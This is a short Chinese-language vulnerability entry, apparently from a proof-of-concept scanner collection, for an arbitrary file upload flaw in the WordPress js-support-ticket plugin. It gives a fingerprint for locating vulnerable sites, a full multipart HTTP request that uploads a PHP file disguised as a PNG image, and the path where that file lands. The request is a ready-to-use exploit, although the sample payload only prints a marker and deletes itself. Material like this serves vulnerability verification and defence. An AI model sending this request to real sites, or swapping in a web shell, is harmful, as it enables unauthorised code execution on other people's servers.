﻿# Wordpress saveconfiguration 任意文件上传漏洞

> 更新时间：2024-04-07

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：body="wp-content/plugins/js-support-ticket"

> 验证脚本：HTTP

```
POST /wp-admin/?page=configuration&task=saveconfiguration HTTP/1.1
Content-Type: multipart/form-data; boundary=--------uhdbghjin

----------uhdbghjin
Content-Disposition: form-data; name="action"

configuration_saveconfiguration
----------uhdbghjin
Content-Disposition: form-data; name="form_request"

jssupportticket
----------uhdbghjin
Content-Disposition: form-data; name="support_custom_img"; filename="dudesuite.php"
Content-Type: image/png

<?php echo "dudesuite";unlink(__FILE__);?>
----------uhdbghjin-- 
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：/wp-content/plugins/js-support-ticket/jssupportticketdata/supportImg/dudesuite.php

> 验证文件来源：Wordpress saveconfiguration 任意文件上传漏洞.poc

